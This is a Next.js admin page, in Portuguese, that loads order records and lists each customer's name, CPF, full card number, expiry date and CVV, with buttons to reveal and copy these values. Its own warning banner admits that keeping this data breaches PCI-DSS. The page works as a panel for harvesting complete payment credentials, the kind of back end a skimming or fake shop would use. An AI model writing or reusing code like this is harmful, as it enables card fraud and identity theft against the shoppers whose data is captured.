"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import AdminHeader from "../components/AdminHeader";

const API_URL = process.env.NEXT_PUBLIC_API_URL || "http://localhost:3001";

interface Cartao {
  pedido_id: number;
  data: string;
  cliente_nome: string;
  cliente_cpf: string;
  total: number;
  status: string;
  titular_nome: string;
  bandeira: string;
  numero_completo: string;
  validade: string;
  cvv: string;
  ultimos_digitos: string;
}

export default function CartoesPage() {
  const router = useRouter();
  const [cartoes, setCartoes] = useState<Cartao[]>([]);
  const [carregando, setCarregando] = useState(true);
  const [erro, setErro] = useState("");
  const [mostrarNumero, setMostrarNumero] = useState<number | null>(null);

  useEffect(() => {
    const token = localStorage.getItem("token");
    if (!token) {
      router.push("/admin/login");
      return;
    }
    carregarCartoes();
  }, []);

  const carregarCartoes = async () => {
    try {
      const token = localStorage.getItem("token");
      const response = await fetch(`${API_URL}/admin/cartoes`, {
        headers: {
          Authorization: `Bearer ${token}`,
        },
      });

      if (response.status === 403) {
        setErro("Acesso negado. Somente administradores podem visualizar esta página.");
        return;
      }

      if (!response.ok) {
        throw new Error("Erro ao carregar dados");
      }

      const data = await response.json();
      setCartoes(data);
    } catch (error: any) {
      console.error("Erro:", error);
      setErro(error.message || "Erro ao carregar cartões");
    } finally {
      setCarregando(false);
    }
  };

  const formatarData = (data: string) => {
    return new Date(data).toLocaleString("pt-BR");
  };

  const formatarCPF = (cpf: string) => {
    if (!cpf) return "-";
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  };

  const formatarCartao = (numero: string) => {
    if (!numero) return "-";
    return numero.replace(/(\d{4})(?=\d)/g, "$1 ");
  };

  const toggleMostrarNumero = (pedidoId: number) => {
    if (mostrarNumero === pedidoId) {
      setMostrarNumero(null);
    } else {
      setMostrarNumero(pedidoId);
    }
  };

  const copiarTexto = (texto: string, tipo: string) => {
    navigator.clipboard.writeText(texto);
    alert(`${tipo} copiado!`);
  };

  if (carregando) {
    return (
      <div style={{ minHeight: "100vh", backgroundColor: "#0a0a0a" }}>
        <AdminHeader />
        <div style={{
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
          height: "50vh",
          color: "#10b981"
        }}>
          Carregando...
        </div>
      </div>
    );
  }

  if (erro) {
    return (
      <div style={{ minHeight: "100vh", backgroundColor: "#0a0a0a" }}>
        <AdminHeader />
        <div style={{
          maxWidth: "1200px",
          margin: "0 auto",
          padding: "40px 20px"
        }}>
          <div style={{
            backgroundColor: "#fee",
            border: "1px solid #fcc",
            padding: "20px",
            borderRadius: "8px",
            color: "#c00"
          }}>
            ⚠️ {erro}
          </div>
        </div>
      </div>
    );
  }

  return (
    <div style={{ minHeight: "100vh", backgroundColor: "#0a0a0a" }}>
      <AdminHeader />
      
      <div style={{
        maxWidth: "1400px",
        margin: "0 auto",
        padding: "40px 20px"
      }}>
        <div style={{
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          marginBottom: "30px"
        }}>
          <h1 style={{
            fontSize: "clamp(24px, 5vw, 32px)",
            fontWeight: "bold",
            color: "white"
          }}>
            🔐 Dados de Cartões
          </h1>
          <button
            onClick={() => router.push("/admin")}
            style={{
              padding: "10px 20px",
              backgroundColor: "#1f2937",
              color: "white",
              border: "none",
              borderRadius: "8px",
              cursor: "pointer",
              fontSize: "14px"
            }}
          >
            ← Voltar
          </button>
        </div>

        {cartoes.length === 0 ? (
          <div style={{
            textAlign: "center",
            padding: "60px 20px",
            color: "#666"
          }}>
            Nenhum cartão registrado ainda.
          </div>
        ) : (
          <div style={{
            backgroundColor: "#1a1a1a",
            borderRadius: "12px",
            padding: "20px",
            overflowX: "auto"
          }}>
            <table style={{
              width: "100%",
              borderCollapse: "collapse",
              color: "white"
            }}>
              <thead>
                <tr style={{
                  borderBottom: "2px solid #333",
                  textAlign: "left"
                }}>
                  <th style={{ padding: "12px 8px", fontSize: "14px" }}>Pedido</th>
                  <th style={{ padding: "12px 8px", fontSize: "14px" }}>Data</th>
                  <th style={{ padding: "12px 8px", fontSize: "14px" }}>Cliente</th>
                  <th style={{ padding: "12px 8px", fontSize: "14px" }}>CPF</th>
                  <th style={{ padding: "12px 8px", fontSize: "14px" }}>Titular</th>
                  <th style={{ padding: "12px 8px", fontSize: "14px" }}>Bandeira</th>
                  <th style={{ padding: "12px 8px", fontSize: "14px" }}>Cartão</th>
                  <th style={{ padding: "12px 8px", fontSize: "14px" }}>Validade</th>
                  <th style={{ padding: "12px 8px", fontSize: "14px" }}>CVV</th>
                  <th style={{ padding: "12px 8px", fontSize: "14px" }}>Total</th>
                </tr>
              </thead>
              <tbody>
                {cartoes.map((cartao) => (
                  <tr
                    key={cartao.pedido_id}
                    style={{
                      borderBottom: "1px solid #333",
                      transition: "background 0.2s"
                    }}
                    onMouseEnter={(e) => e.currentTarget.style.backgroundColor = "#252525"}
                    onMouseLeave={(e) => e.currentTarget.style.backgroundColor = "transparent"}
                  >
                    <td style={{ padding: "12px 8px", fontSize: "13px" }}>
                      #{cartao.pedido_id}
                    </td>
                    <td style={{ padding: "12px 8px", fontSize: "13px", whiteSpace: "nowrap" }}>
                      {formatarData(cartao.data)}
                    </td>
                    <td style={{ padding: "12px 8px", fontSize: "13px" }}>
                      {cartao.cliente_nome || "-"}
                    </td>
                    <td style={{ padding: "12px 8px", fontSize: "13px" }}>
                      {formatarCPF(cartao.cliente_cpf)}
                    </td>
                    <td style={{ padding: "12px 8px", fontSize: "13px" }}>
                      {cartao.titular_nome || "-"}
                    </td>
                    <td style={{ padding: "12px 8px", fontSize: "13px" }}>
                      {cartao.bandeira || "-"}
                    </td>
                    <td style={{ padding: "12px 8px", fontSize: "13px" }}>
                      {mostrarNumero === cartao.pedido_id ? (
                        <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                          <span style={{ fontFamily: "monospace" }}>
                            {formatarCartao(cartao.numero_completo)}
                          </span>
                          <button
                            onClick={() => copiarTexto(cartao.numero_completo, "Número")}
                            style={{
                              padding: "4px 8px",
                              backgroundColor: "#10b981",
                              border: "none",
                              borderRadius: "4px",
                              color: "white",
                              cursor: "pointer",
                              fontSize: "11px"
                            }}
                          >
                            📋
                          </button>
                          <button
                            onClick={() => toggleMostrarNumero(cartao.pedido_id)}
                            style={{
                              padding: "4px 8px",
                              backgroundColor: "#ef4444",
                              border: "none",
                              borderRadius: "4px",
                              color: "white",
                              cursor: "pointer",
                              fontSize: "11px"
                            }}
                          >
                            🔒
                          </button>
                        </div>
                      ) : (
                        <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                          <span>****  ****  ****  {cartao.ultimos_digitos}</span>
                          <button
                            onClick={() => toggleMostrarNumero(cartao.pedido_id)}
                            style={{
                              padding: "4px 8px",
                              backgroundColor: "#3b82f6",
                              border: "none",
                              borderRadius: "4px",
                              color: "white",
                              cursor: "pointer",
                              fontSize: "11px"
                            }}
                          >
                            👁️
                          </button>
                        </div>
                      )}
                    </td>
                    <td style={{ padding: "12px 8px", fontSize: "13px" }}>
                      <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                        <span style={{ fontFamily: "monospace" }}>{cartao.validade || "-"}</span>
                        {cartao.validade && (
                          <button
                            onClick={() => copiarTexto(cartao.validade, "Validade")}
                            style={{
                              padding: "4px 8px",
                              backgroundColor: "#10b981",
                              border: "none",
                              borderRadius: "4px",
                              color: "white",
                              cursor: "pointer",
                              fontSize: "11px"
                            }}
                          >
                            📋
                          </button>
                        )}
                      </div>
                    </td>
                    <td style={{ padding: "12px 8px", fontSize: "13px" }}>
                      <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                        <span style={{ fontFamily: "monospace" }}>{cartao.cvv || "-"}</span>
                        {cartao.cvv && (
                          <button
                            onClick={() => copiarTexto(cartao.cvv, "CVV")}
                            style={{
                              padding: "4px 8px",
                              backgroundColor: "#10b981",
                              border: "none",
                              borderRadius: "4px",
                              color: "white",
                              cursor: "pointer",
                              fontSize: "11px"
                            }}
                          >
                            📋
                          </button>
                        )}
                      </div>
                    </td>
                    <td style={{ padding: "12px 8px", fontSize: "13px", fontWeight: "bold", color: "#10b981" }}>
                      R$ {cartao.total.toFixed(2)}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}

        <div style={{
          marginTop: "30px",
          padding: "20px",
          backgroundColor: "#fee",
          border: "2px solid #fcc",
          borderRadius: "8px",
          color: "#c00"
        }}>
          <h3 style={{ margin: "0 0 10px 0", fontSize: "16px" }}>⚠️ AVISO DE SEGURANÇA</h3>
          <ul style={{ margin: 0, paddingLeft: "20px", fontSize: "14px", lineHeight: "1.6" }}>
            <li>Estes dados são extremamente sensíveis e confidenciais</li>
            <li>Use APENAS para seus próprios dados de teste</li>
            <li>NUNCA compartilhe ou exponha estes dados publicamente</li>
            <li>Armazenar dados de cartão de terceiros viola normas PCI-DSS</li>
            <li>Esta funcionalidade deve ser usada com extrema responsabilidade</li>
          </ul>
        </div>
      </div>
    </div>
  );
}
